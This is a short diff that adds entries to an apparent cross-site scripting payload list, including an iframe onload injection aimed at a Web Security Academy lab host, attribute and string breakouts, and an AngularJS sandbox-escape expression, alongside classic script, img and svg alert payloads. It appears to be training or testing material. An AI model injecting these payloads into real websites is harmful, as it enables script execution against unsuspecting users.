@@ -1,3 +1,9 @@
+<iframe src="https://0a85000d037e197c815275e200c80061.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+"onmouseout="alert(1)
+
+\"-alert(1)}//
+{{$on.constructor('alert(1)')()}}
+
 <script>alert('XSS')</script>
 <img src=x onerror=alert('XSS')>
 <svg onload=alert('XSS')>
